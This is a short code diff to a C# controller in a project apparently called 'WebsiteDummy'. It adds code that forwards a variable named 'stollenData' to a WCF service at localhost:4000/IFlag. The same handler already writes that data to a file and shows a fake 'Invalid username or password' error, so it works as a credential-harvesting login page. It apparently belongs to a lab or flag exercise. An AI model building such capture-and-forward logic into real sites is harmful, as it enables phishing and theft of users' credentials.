@@ -1,7 +1,10 @@
-﻿using System;
+﻿using Common;
+using System;
 using System.Collections.Generic;
+using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
+using System.ServiceModel;
 using System.Web;
 using System.Web.Hosting;
 using System.Web.Mvc;
@@ -30,6 +33,11 @@ namespace WebsiteDummy.Controllers
 			{
 				sw.WriteLine(stollenData);
 			}
+
+
+			ChannelFactory<IFlag> factory = new ChannelFactory<IFlag>(new NetTcpBinding(), new EndpointAddress("net.tcp://localhost:4000/IFlag"));
+			IFlag channel = factory.CreateChannel();
+			channel.SendData(stollenData);
 
 
 			ViewBag.error = "Invalid username or password";
